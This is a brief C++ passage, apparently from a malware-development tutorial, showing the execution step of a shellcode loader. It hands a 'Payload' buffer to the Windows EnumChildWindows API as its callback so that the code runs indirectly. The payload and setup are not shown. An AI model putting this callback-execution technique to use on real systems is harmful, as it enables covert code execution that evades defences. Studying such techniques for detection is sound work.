...
int main() {
    cout << "[i] Payload At : 0x" << static_cast<const void*>(Payload) << endl;
    cout << "[#] Press <Enter> To Run EnumChildWindows ... ";
    cin.get();

    if (!EnumChildWindows(NULL, (WNDENUMPROC)Payload, NULL)) {
        cerr << "[!] EnumChildWindows Failed With Error : " << GetLastError() << endl;
        return -1;
    }
